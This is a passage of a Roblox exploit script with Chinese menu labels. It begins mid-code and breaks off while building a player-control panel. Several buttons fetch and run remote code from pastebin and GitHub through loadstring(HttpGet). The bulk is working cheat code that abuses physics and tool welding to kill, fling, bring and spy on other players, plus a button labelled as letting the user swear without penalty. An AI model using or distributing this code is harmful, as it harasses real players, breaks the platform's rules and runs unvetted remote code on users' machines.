Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Princess.Name = "A_Princess"
A_Princess.Parent = SpecialTab
A_Princess.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Princess.BorderSizePixel = 0
A_Princess.Position = UDim2.new(0, 0, 0.645296335, 0)
A_Princess.Size = UDim2.new(0, 150, 0, 30)
A_Princess.Font = Enum.Font.SciFi
A_Princess.Text = "国王"
A_Princess.TextColor3 = Color3.new(1, 1, 1)
A_Princess.TextSize = 20
A_Princess.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

Category_2.Name = "Category"
Category_2.Parent = SpecialTab
Category_2.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
Category_2.BorderSizePixel = 0
Category_2.Size = UDim2.new(0, 150, 0, 30)
Category_2.Text = "特别的"
Category_2.TextColor3 = Color3.new(0, 0.835294, 1)
Category_2.TextSize = 14

OtherTab.Name = "OtherTab"
OtherTab.Parent = Main
OtherTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
OtherTab.BackgroundTransparency = 1
OtherTab.BorderSizePixel = 0
OtherTab.Position = UDim2.new(0, 0, 1.06800008, 0)
OtherTab.Size = UDim2.new(0, 150, 0, 220)

Category_3.Name = "Category"
Category_3.Parent = OtherTab
Category_3.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
Category_3.BorderSizePixel = 0
Category_3.Size = UDim2.new(0, 150, 0, 30)
Category_3.Text = "其他的"
Category_3.TextColor3 = Color3.new(0, 0.835294, 1)
Category_3.TextSize = 14

A_None.Name = "A_None"
A_None.Parent = OtherTab
A_None.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_None.BorderSizePixel = 0
A_None.Position = UDim2.new(0, 0, 0.134545445, 0)
A_None.Size = UDim2.new(0, 150, 0, 30)
A_None.Font = Enum.Font.SciFi
A_None.Text = "没有任何"
A_None.TextColor3 = Color3.new(1, 1, 1)
A_None.TextSize = 20
A_None.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=0"
Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=0"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

A_Anthro.Name = "A_Anthro"
A_Anthro.Parent = OtherTab
A_Anthro.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
A_Anthro.BorderSizePixel = 0
A_Anthro.Position = UDim2.new(0, 0, 0.269090891, 0)
A_Anthro.Size = UDim2.new(0, 150, 0, 30)
A_Anthro.Font = Enum.Font.SciFi
A_Anthro.Text = "人类 (默认)"
A_Anthro.TextColor3 = Color3.new(1, 1, 1)
A_Anthro.TextSize = 20
A_Anthro.MouseButton1Click:Connect(function()
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

wait(1)
Main:TweenPosition(UDim2.new(0.421999991, 0, 0.28400004, 0))


  	end    

})

Tab:AddButton({

	Name = "阿尔飞行",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/5zJu3hfN"))()

  	end    

})

Tab:AddButton({

	Name = "Fc指令",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

  	end    

})

Tab:AddButton({

	Name = "进入提示",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua"))()

  	end    

})

Tab:AddButton({

	Name = "立刻死亡",

	Callback = function()

     game.Players.LocalPlayer.Character.Humanoid.Health=0

  	end    

})

Tab:AddButton({

	Name = "骂人无违规",

	Callback = function()

     loadstring(game:GetObjects("rbxassetid://1262435912")[1].Source)()

  	end    

})

Tab:AddButton({

	Name = "玩家控制",

	Callback = function()

     if not game:IsLoaded() then
	game.Loaded:Wait()
end

local plrs = game:GetService("Players")
local lp = plrs.LocalPlayer
local mouse = lp:GetMouse()
local ws = game:GetService("Workspace")
local cg = game:GetService("CoreGui")
local pg = lp:FindFirstChildOfClass("PlayerGui")
local rs = game:GetService("RunService")
local uis = game:GetService("UserInputService")
local stepped = rs.Stepped
local renderstepped = rs.RenderStepped
local heartbeat = rs.Heartbeat
local guiname = tostring((game.PlaceId - lp.UserId) / 2)
local currentplayer = lp
local shp = sethiddenproperty or set_hidden_property or sethiddenprop or set_hidden_prop
local ssr = setsimulationradius or setsimradius or set_simulation_radius
local v3 = Vector3.new
local v3_0 = v3(0, 0, 0)
local cf = CFrame.new
local flycf = false

local function gp(parent, name, className)
	local ret = nil
	pcall(function()
		for i, v in pairs(parent:GetChildren()) do
			if (v.Name == name) and v:IsA(className) then
				ret = v
				break
			end
		end
	end)
	return ret
end

local gui = gp(cg, guiname, "ScreenGui") or gp(pg, guiname, "ScreenGui")
if gui then
	gui:Destroy()
end

gui = Instance.new("ScreenGui")
gui.Name = guiname
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Enabled = false
gui.IgnoreGuiInset = true
pcall(function()
    gui.Parent = cg
end)
if gui.Parent ~= cg then
    gui.Parent = pg
end
gui:GetPropertyChangedSignal("Parent"):Connect(function()
    if not (gui and gui.Parent) then
        gui = false
    end
end)
local mainFrame = Instance.new("Frame")
mainFrame.Name = "mainFrame"
mainFrame.Parent = gui
mainFrame.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
mainFrame.BorderSizePixel = 0
mainFrame.Position = UDim2.new(0, 0, 1, -200)
mainFrame.Size = UDim2.new(1, 0, 0, 200)
local mf = Instance.new("Frame")
mf.Name = "mf"
mf.Parent = mainFrame
mf.BackgroundColor3 = mainFrame.BackgroundColor3
mf.BorderSizePixel = 0
mf.Position = UDim2.new(0, 0, 1, 0)
mf.Size = UDim2.new(1, 0, 1, 0)
local scriptName = Instance.new("TextLabel")
scriptName.Name = "scriptName"
scriptName.Parent = mainFrame
scriptName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scriptName.BackgroundTransparency = 1.000
scriptName.BorderSizePixel = 0
scriptName.Size = UDim2.new(1, 0, 0, 20)
scriptName.Font = Enum.Font.SourceSans
scriptName.Text = "控制玩家脚本 作者MyWorld 汉化1972845799"
scriptName.TextColor3 = Color3.fromRGB(181, 181, 181)
scriptName.TextSize = 20.000
scriptName.TextWrapped = true
local line = Instance.new("Frame")
line.Name = "line"
line.Parent = scriptName
line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
line.BackgroundTransparency = 0.700
line.BorderSizePixel = 0
line.Position = UDim2.new(0, 5, 1, 0)
line.Size = UDim2.new(1, -10, 0, 1)
local showhide = Instance.new("TextButton")
showhide.Name = "showhide"
showhide.Parent = mainFrame
showhide.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
showhide.BorderSizePixel = 0
showhide.Position = UDim2.new(0.5, -25, 0, -30)
showhide.Size = UDim2.new(0, 50, 0, 30)
showhide.Font = Enum.Font.SourceSans
showhide.Text = "\\/"
showhide.TextColor3 = Color3.fromRGB(235, 235, 235)
showhide.TextSize = 20.000
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Name = "scrollingFrame"
scrollingFrame.Parent = mainFrame
scrollingFrame.Active = true
scrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scrollingFrame.BackgroundTransparency = 1.000
scrollingFrame.BorderSizePixel = 0
scrollingFrame.ClipsDescendants = false
scrollingFrame.Position = UDim2.new(0, 5, 0, 30)
scrollingFrame.Size = UDim2.new(1, -10, 1, -35)
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollingFrame.ScrollBarThickness = 10
scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.X
local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = scrollingFrame
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 10)

local event = Instance.new("BindableEvent", gui)
local fps = 60
fps = 1 / fps
local tf = 0
local con = nil
con = renderstepped:Connect(function(s)
    if not gui then
	    con:Disconnect()
	    return
	end
	tf += s
	if tf >= fps then
		for i=1, math.floor(tf / fps) do
			event:Fire(true)
		end
		tf = 0
	end
end)
local event = event.Event

local sn = scriptName.Text
local function notify(msg)
	spawn(function()
		local msg1 = sn .. " - " .. msg
		scriptName.Text = msg1
		wait(3)
		if scriptName.Text == msg1 then
			scriptName.Text = sn
		end
	end)
end

if gui.Parent == pg then
    notify("gui in playerGui")
end

local ancprt = nil
local function weldtp(part, cfr)
	if not (part and part.Parent and part:IsA("BasePart") and (not part:IsGrounded())) then
		return nil
	end
	if not (ancprt and ancprt.Parent and ancprt:IsA("BasePart") and ancprt:IsGrounded() and ancprt:IsDescendantOf(ws)) then
		for i, v in pairs(ws:GetDescendants()) do
			if v and v.Parent and v:IsA("BasePart") and v:IsGrounded() then
				ancprt = v
				break
			end
		end
	end
	if not ancprt then
		ancprt = Instance.new("Part", ws)
		ancprt.Anchored = true
		ancprt.Transparency = 1
		ancprt.CanCollide = false
		ancprt.Name = "weldtp part"
	end
	local weld = Instance.new("Weld")
	weld.Part0 = part
	weld.C0 = cfr:Inverse()
	weld.Part1 = ancprt
	weld.C1 = ancprt.CFrame:Inverse()
	weld.Parent = ws
	stepped:Wait()
	pcall(function()
		weld:Destroy()
	end)
end

local function makeFrame(parent, text, color)
	local frame = Instance.new("Frame")
	frame.Name = "frame_" .. text
	frame.Parent = parent
	frame.BackgroundColor3 = color
	frame.Size = UDim2.new(0, 300, 0, 145)
	frame.BorderSizePixel = 0
	local framelabel = Instance.new("TextLabel")
	framelabel.Name = "framelabel"
	framelabel.Parent = frame
	framelabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	framelabel.BackgroundTransparency = 1.000
	framelabel.BorderSizePixel = 0
	framelabel.Size = UDim2.new(1, 0, 0, 20)
	framelabel.Font = Enum.Font.SourceSans
	framelabel.Text = text
	framelabel.TextColor3 = Color3.fromRGB(197, 197, 197)
	framelabel.TextSize = 14.000
	local line = Instance.new("Frame")
	line.Name = "line"
	line.Parent = framelabel
	line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	line.BackgroundTransparency = 0.700
	line.BorderSizePixel = 0
	line.Position = UDim2.new(0, 5, 1, 0)
	line.Size = UDim2.new(1, -10, 0, 1)
	local ScrollingFrame = Instance.new("ScrollingFrame")
	ScrollingFrame.Parent = frame
	ScrollingFrame.Active = true
	ScrollingFrame.Name = "ScrollingFrame"
	ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ScrollingFrame.BackgroundTransparency = 1.000
	ScrollingFrame.BorderSizePixel = 0
	ScrollingFrame.Position = UDim2.new(0, 5, 0, 25)
	ScrollingFrame.Size = UDim2.new(1, -5, 1, -30)
	ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	ScrollingFrame.ScrollBarThickness = 7
	ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
	local UIListLayout = Instance.new("UIListLayout")
	UIListLayout.Parent = ScrollingFrame
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.Padding = UDim.new(0, 5)
	return frame
end

showhide.MouseButton1Click:Connect(function()
	if showhide.Text == "/\\" then
		showhide.Text = "\\/"
		mainFrame:TweenPosition(UDim2.new(0, 0, 1, -200), "Out", "Elastic", 1)
	else
		showhide.Text = "/\\"
		mainFrame:TweenPosition(UDim2.new(0, 0, 1, -5), "Out", "Elastic", 1)
	end
end)

local controllable = {}
local lastc = nil
local con = nil
con = lp.CharacterAdded:Connect(function(c)
    if not gui then
        con:Disconnect()
        return
    end
    if lastc == c then
        return
    end
    if c and c.Parent then
        lastc = c
        controllable = {}
        for i, v in pairs(plrs:GetPlayers()) do
            local c = v.Character
            if c and c.Parent then
                table.insert(controllable, c)
            end
        end
    end
end)

local viewedPlayer = nil
local viewbutton = {Text = "监视"}

local playersframe = makeFrame(scrollingFrame, "玩家", Color3.fromRGB(12, 59, 100))
local playercframe = makeFrame(playersframe, "playerscontrol", Color3.fromRGB(12, 59, 100))
playercframe.BorderSizePixel = 1.000
playercframe.BorderColor3 = Color3.fromRGB(27, 42, 53)
playercframe.Position = UDim2.new(0, 10, -1, -40)
playercframe.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
playercframe.Visible = true
local playerframef = makeFrame(playercframe, "friends", Color3.fromRGB(0, 150, 0))
playerframef.Position = UDim2.new(1, 10, 0, 5)

local function addbtn(parent, plr)
	local playerbutton = Instance.new("TextButton")
	playerbutton.Name = plr.Name
	playerbutton.Parent = parent
	if plr == lp then
		playerbutton.BackgroundColor3 = Color3.fromRGB(100, 200, 200)
	else
		playerbutton.BackgroundColor3 = Color3.fromRGB(136, 136, 136)
	end
	playerbutton.BorderSizePixel = 0
	playerbutton.Size = UDim2.new(1, -10, 0, 20)
	playerbutton.Font = Enum.Font.SourceSans
	playerbutton.Text = plr.Name
	if plr.Name ~= plr.DisplayName then
		playerbutton.Text = playerbutton.Text .. " (" .. plr.DisplayName .. ")"
	end
	playerbutton.TextColor3 = Color3.fromRGB(0, 0, 0)
	playerbutton.TextSize = 15.000
	playerbutton.MouseButton1Click:Connect(function()
		playercframe.framelabel.Text = "玩家:" .. playerbutton.Text
		currentplayer = plr
		playercframe.Visible = true
		playerframef.Visible = false
		viewbutton.Text = ((viewedPlayer == plr) and "退出监视") or "监视"
	end)
end

local function unview()
    viewedPlayer = nil
    viewbutton.Text = "监视"
	local c = lp.Character
	if c and c.Parent then
	    local subject = c:FindFirstChildOfClass("Humanoid") or c:FindFirstChildWhichIsA("BasePart")
	    if subject then
    	    ws.CurrentCamera.CameraType = Enum.CameraType.Custom
    		ws.CurrentCamera.CameraSubject = subject
		else
		    notify("no part to view")
		end
	else
		notify("character not found")
	end
end

local playersScroll = playersframe.ScrollingFrame

for i, v in pairs(plrs:GetPlayers()) do
	addbtn(playersScroll, v)
end
local reset = function() end
local con = nil
con = plrs.PlayerAdded:Connect(function(plr)
	if gui then
		addbtn(playersScroll, plr)
	else
	    con:Disconnect()
	end
end)
local con = nil
con = plrs.PlayerRemoving:Connect(function(plr)
	if gui then
		local playerbutton = gp(playersScroll, plr.Name, "TextButton")
		if playerbutton then
			playerbutton:Destroy()
		end
		if plr == currentplayer then
			playercframe.Visible = false
		end
		if plr == viewedPlayer then
		    unview()
		end
	else
	    con:Disconnect()
	end
end)
local hideplayerc = Instance.new("TextButton")
hideplayerc.Name = "addpositionbutton"
hideplayerc.Parent = playercframe.framelabel
hideplayerc.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
hideplayerc.BorderSizePixel = 0
hideplayerc.Position = UDim2.new(1, -17, 0, 2)
hideplayerc.Size = UDim2.new(0, 15, 0, 15)
hideplayerc.Font = Enum.Font.SourceSans
hideplayerc.Text = "X"
hideplayerc.TextColor3 = Color3.fromRGB(206, 206, 206)
hideplayerc.TextSize = 14.000
hideplayerc.MouseButton1Click:Connect(function()
	playercframe.Visible = false
end)
local function makeplrbutton(buttontext)
	local button = Instance.new("TextButton")
	button.Name = "plrButton"
	button.Parent = playercframe.ScrollingFrame
	button.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
	button.BorderSizePixel = 0
	button.Size = UDim2.new(1, -10, 0, 20)
	button.Font = Enum.Font.SourceSans
	button.Text = buttontext
	button.TextColor3 = Color3.fromRGB(226, 226, 226)
	button.TextSize = 15.000
	return button
end
makeplrbutton("传送").MouseButton1Click:Connect(function()
	local c = lp.Character
	if c and c.Parent then
		local tp = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "Head", "BasePart") or c:FindFirstChildWhichIsA("BasePart")
		if tp then
			local c1 = currentplayer.Character
			if c1 and c1.Parent then
				local to = gp(c1, "HumanoidRootPart", "BasePart") or gp(c1, "Head", "BasePart") or c1:FindFirstChildWhichIsA("BasePart")
				if to then
					if flycf then
						flycf = to.CFrame
					else
						weldtp(tp, to.CFrame)
					end
					notify("goto: " .. currentplayer.Name)
				else
					notify("no target part found")
				end
			else
				notify("target character not found")
			end
		else
			notify("no part found")
		end
	else
		notify("character not found")
	end
end)
viewbutton = makeplrbutton("监视")
viewbutton.MouseButton1Click:Connect(function()
    if viewedPlayer == currentplayer then
        unview()
    else
	    viewedPlayer = currentplayer
	    viewbutton.Text = "退出监视"
	end
end)

local cbringb = makeplrbutton("把他传送过来")

local function noanimations()
	local c = lp.Character
	if c and c.Parent then
		local hum = c:FindFirstChildOfClass("Humanoid")
		if hum then
			local animate = gp(c, "Animate", "LocalScript")
			if animate then
				animate.Disabled = true
			end
			for i, v in pairs(hum:GetPlayingAnimationTracks()) do
				v:Stop()
			end
		else
			notify("humanoid not found")
		end
	else
		notify("character not found")
	end
end

local function isConnected(part0, part1, tested)
    if not ((typeof(part0) == "Instance") and part0:IsA("BasePart")) then
        return false
    end
    if not ((typeof(part1) == "Instance") and part1:IsA("BasePart")) then
        return false
    end
    if not tested then
        tested = {}
    end
    local ret = false
    table.insert(tested, part0)
    for i, v in pairs(part0:GetConnectedParts()) do
        if part1 == v then
            return true
        elseif not table.find(tested, v) then
            ret = ret or isConnected(v, part1, tested)
        end
    end
    return ret
end

local function attach(c1)
    local bck = lp:FindFirstChildOfClass("Backpack")
	local c = lp.Character
	--checks for: model, humanoid, arm, torso for main character:
	if not (c and c.Parent) then
	    notify("character not found")
	    return false
	end
	local hum = c:FindFirstChildOfClass("Humanoid")
	if not hum then
	    notify("humanoid not found")
	    return false
	end 
	local arm = gp(c, "Right Arm", "BasePart") or gp(c, "RightHand", "BasePart")
	if not arm then
	    notify("arm not found")
	    return false
	end
	local torso = gp(c, "Torso", "BasePart") or gp(c, "UpperTorso", "BasePart")
	if not torso then
	    notify("torso not found")
	    return
	end
	if torso:IsGrounded() then
	    notify("torso is grounded")
	    return
	end
	if not isConnected(arm, torso) then
	    notify("arm and toso not connected")
	    return
	end
	--checks for: tool:
	local tool = c:FindFirstChildOfClass("Tool")
	if (not tool) and bck then
		tool = bck:FindFirstChildOfClass("Tool")
	end
	if not tool then
	    notify("no tool found")
	    return false
	end
	local handle = gp(tool, "Handle", "BasePart")
	if not handle then
	    notify("tool handle not found")
	    return
	end
	--checks for: model, humanoid, arm, torso for target character:
	if not (c1 and c1.Parent) then
	    notify("target character not found")
	    return false
	end
	local hum1 = c1:FindFirstChildOfClass("Humanoid")
	if not hum1 then
	    notify("target humanoid not found")
	    return false
	end
	local arm1 = gp(c1, "Right Arm", "BasePart") or gp(c1, "RightHand", "BasePart")
	if not arm1 then
	    notify("target arm not found")
	    return false
	end
	local torso1 = gp(c1, "Torso", "BasePart") or gp(c1, "UpperTorso", "BasePart")
	if not torso1 then
	    notify("target torso not found")
	    return
	end
	if torso1:IsGrounded() then
	    notify("target torso is grounded")
	    return
	end
	if not isConnected(arm1, torso1) then
	    notify("target arm and toso not connected")
	    return
	end
	--all checks good
	if bck then
    	for i, v in pairs(c:GetChildren()) do
    	    if v:IsA("Tool") then
    	        v.Parent = bck
    	    end
    	end
	end
	local nhum = hum:Clone()
	hum:Destroy()
	hum = nhum
	hum.Parent = c
	hum:EquipTool(tool)
	for i, v in pairs(c1:GetDescendants()) do
		if v and v.Parent and v:IsA("BasePart") then
			v.Massless = true
		end
	end
	while stepped:Wait() do
	    --checks for: model, humanoid, arm, torso for main character:
	    if not (c and c.Parent) then
	        notify("character removed")
	        return false
	    end
	    if (not hum and hum.Parent) then
	        notify("humanoid removed")
	        return false
	    end
	    if not (arm and arm.Parent) then
	        notify("arm removed")
	        return false
	    end
	    if not (torso and torso.Parent) then
	        notify("torso removed")
	        return false
	    end
	    if torso:IsGrounded() then
    	    notify("torso got grounded")
    	    return
    	end
	    if not isConnected(arm, torso) then
    	    notify("arm and toso connection removed")
    	    return
    	end
	    --checks for: model, humanoid, arm, torso for target character:
	    if not (c1 and c1.Parent) then
	        notify("target character removed")
	        return false
	    end
	    if not (hum1 and hum1.Parent) then
	        notify("target humanoid removed")
	        return false
	    end
	    if not (arm1 and arm1.Parent) then
	        notify("target arm removed")
	        return false
	    end
	    if not (torso1 and torso1.Parent) then
	        notify("target torso removed")
	        return false
	    end
	    if torso:IsGrounded() then
            notify("target torso got grounded")
            return
        end
	    if not isConnected(arm1, torso1) then
    	    notify("target arm and toso connection removed")
    	    return
    	end
    	--checks for: tool
	    if not (tool and tool.Parent) then
	        notify("tool removed")
	        return false
	    end
	    if not (handle and handle.Parent) then
	        notify("tool handle removed")
	        return false
	    end
	    if (tool.Parent ~= c) and (tool.Parent ~= c1) and (tool.Parent ~= bck) then
	        notify("unexpected tool parent")
	        return false
	    end
	    --all checks good
	    if (tool.Parent == c1) then
	        break
	    end
	    tool.Parent = c
	    weldtp(arm1, handle.CFrame)
	    if (tool.Parent == c1) then
	        break
	    end
	end
	return handle
end

makeplrbutton("bring").MouseButton1Click:Connect(function()
    local plr = currentplayer
    local c1 = plr.Character
    if not (c1 and c1.Parent) then
        notify("target character not found")
        return
    end
    if not table.find(controllable, c1) then
        reset(true)
        wait(0.1)
    end
    if not (plr and plr.Parent) then
        notify("target player left")
        return
    end
    if not (c1 and c1.Parent) then
        c1 = currentplayer.Character
    end
    if not (c1 and c1.Parent) then
        notify("target character not found")
        return
    end
	local c = lp.Character
	if not (c and c.Parent) then
	    notify("character not found")
        return
	end
	local part = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "Torso", "BasePart") or gp(c, "UpperTorso", "BasePart") or gp(c, "Head", "BasePart")
	if not part then
	    notify("part not found")
	    return
	end
	local cfr = part.CFrame
	local joint = attach(currentplayer.Character)
	if not joint then
	    return
	end
	weldtp(part, cfr)
	wait(0.5)
	if c and c.Parent and part and part.Parent and joint and joint.Parent then
		weldtp(part, cfr)
		if not (joint and joint.Parent) then
		    notify("joint removed")
		    reset(false)
		    return
		end
		joint:BreakJoints()
		reset(false)
		notify("brought " .. currentplayer.Name)
	end
end)

makeplrbutton("杀掉").MouseButton1Click:Connect(function()
	local plr = currentplayer
    local c1 = plr.Character
    if not (c1 and c1.Parent) then
        notify("target character not found")
        return
    end
    if not table.find(controllable, c1) then
        reset(true)
        wait(0.1)
    end
    if not (plr and plr.Parent) then
        notify("target player left")
        return
    end
    if not (c1 and c1.Parent) then
        notify("target character removed")
        return
    end
	local c = lp.Character
	if not (c and c.Parent) then
	    notify("character not found")
        return
	end
	local part = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "Torso", "BasePart") or gp(c, "UpperTorso", "BasePart") or gp(c, "Head", "BasePart")
	if not part then
	    notify("part not found")
	    return
	end
	local cfr = part.CFrame
	local joint = attach(currentplayer.Character)
	if not joint then
	    return
	end
	weldtp(part, cfr)
	local con, con1 = nil, nil
	con = heartbeat:Connect(function()
	    if not (part and part.Parent) then
	        con:Disconnect()
	        con1:Disconnect()
	        return
	    end
	    part.Velocity = v3(0, -200000, 0)
	end)
	con1 = stepped:Connect(function()
	    if not (part and part.Parent) then
	        con:Disconnect()
	        con1:Disconnect()
	        return
	    end
	    part.Velocity = v3_0
	end)
	wait(0.5)
	con:Disconnect()
	con1:Disconnect()
	if c and c.Parent and part and part.Parent and joint and joint.Parent then
		weldtp(part, cfr)
		if not (joint and joint.Parent) then
		    notify("joint removed")
		    reset(false)
		    return
		end
		joint:BreakJoints()
		reset(false)
		notify("attempted to kill " .. currentplayer.Name)
	else
	    notify("something went wrong")
	end
end)

makeplrbutton("附加").MouseButton1Click:Connect(function()
	return attach(currentplayer.Character) and notify("attached to " .. currentplayer.Name)
end)

makeplrbutton("他的好友").MouseButton1Click:Connect(function()
	playerframef.Visible = not playerframef.Visible
	if not playerframef.Visible then
		return
	end
	playerframef.framelabel.Text = "friends of: " .. currentplayer.Name
	local scroll = playerframef.ScrollingFrame
	for i, v in pairs(scroll:GetChildren()) do
		if v and v.Parent and v:IsA("TextButton") then
			v:Destroy()
		end
	end
	for i, v in pairs(plrs:GetPlayers()) do
		spawn(function()
			if v and v.Parent and currentplayer:IsFriendsWith(v.UserId) then
				addbtn(playerframef.ScrollingFrame, v)
			end
		end)
	end
end)

local function makeflingbutton(partname)
	makeplrbutton("甩飞他 (" .. partname .. ")").MouseButton1Click:Connect(function()
		local c = lp.Character
		if c and c.Parent then
			local hrp = gp(c, partname, "BasePart")
			if hrp then
				local c1 = currentplayer.Character
				if c1 and c1.Parent then
					local hrp1 = gp(c1, partname, "BasePart")
					if hrp1 then						
						c:BreakJoints()
						hrp.CustomPhysicalProperties = PhysicalProperties.new(0.01, 0.01, 0.01, 0.01, 0.01)
						for i, v in pairs(c:GetChildren()) do
							if (v ~= hrp) and v and v.Parent and v:IsA("BasePart") then
								v:Destroy()
							end
						end
						hrp.Transparency = 0.5
						while heartbeat:Wait() and c and c.Parent and hrp and hrp.Parent and c1 and c1.Parent and hrp1 and hrp1.Parent do
							local pos = {x=0, y=0, z=0}
							pos.x = hrp1.Position.X
							pos.y = hrp1.Position.Y
							pos.z = hrp1.Position.Z
							pos.x += hrp1.Velocity.X / 2
							pos.y += hrp1.Velocity.Y / 2
							pos.z += hrp1.Velocity.Z / 2
							local heightlock = ws.FallenPartsDestroyHeight + 5
							if pos.y < heightlock then
								pos.y = heightlock
							end
							hrp.CanCollide = false
							hrp.Position = v3(pos.x, pos.y, pos.z)
							hrp.Velocity = v3(0, 1000, 0)
							hrp.RotVelocity = v3(10000, 10000, 10000)
							ws.CurrentCamera.CameraSubject = hrp1
						end
						wait(0.1)
						ws.CurrentCamera.CameraSubject = (lp.Character and lp.Character.Parent and lp.Character:FindFirstChildOfClass("Humanoid")) or nil
					else
						notify("target part not found")
					end
				else
					notify("target character not found")
				end
			else
				notify("part not found")
			end
		else
			notify("character not found")
		end
	end)
end
makeflingbutton("头")
makeflingbutton("手")
makeflingbutton("躯干")

local graphicsframe = makeFrame(scrollingFrame, "图形", Color3.fromRGB(84, 45, 162))
local function makegraphicsbutton(buttontext)
	local button = Instance.new("TextButton")
	button.Name = "removefog"
	button.Parent = graphicsframe.ScrollingFrame
	button.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
	button.BorderSizePixel = 0
	button.Size = UDim2.new(1, -10, 0, 20)
	button.Font = Enum.Font.SourceSans
	button.Text = buttontext
	button.TextColor3 = Color3.fromRGB(226, 226, 226)
	button.TextSize = 15.000
	return button
end
local lig = game:GetService("Lighting")
makegraphicsbutton("删除贴图").MouseButton1Click:Connect(function()
	lig.FogStart = 9e9
	lig.FogEnd = 9e9
end)
local function setupremove(button, classname)
	button.MouseButton1Click:Connect(function()
		for i, v in pairs(game:GetDescendants()) do
			if v:IsA(classname) then
				v:Destroy()
			end
		end
	end)
end
setupremove(makegraphicsbutton("删除特效"), "Atmosphere")
setupremove(makegraphicsbutton("消除模糊"), "BlurEffect")
setupremove(makegraphicsbutton("删除贴画"), "Decal")
setupremove(makegraphicsbutton("默认天空"), "Sky")
setupremove(makegraphicsbutton("去除阳光"), "SunRaysEffect")
setupremove(makegraphicsbutton("去除粒子"), "ParticleEmitter")
setupremove(makegraphicsbutton("删除颜色校正效果"), "ColorCorrectionEffect")

local cfly = nil
local fhrp = nil
local flyspeed = 1

local positionsframe = makeFrame(scrollingFrame, "位置", Color3.fromRGB(162, 108, 42))
local addpositionbutton = Instance.new("TextButton")
addpositionbutton.Name = "addpositionbutton"
addpositionbutton.Parent = positionsframe.framelabel
addpositionbutton.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
addpositionbutton.BorderSizePixel = 0
addpositionbutton.Position = UDim2.new(1, -77, 0, 2)
addpositionbutton.Size = UDim2.new(0, 75, 1, -4)
addpositionbutton.Font = Enum.Font.SourceSans
addpositionbutton.Text = "+添加"
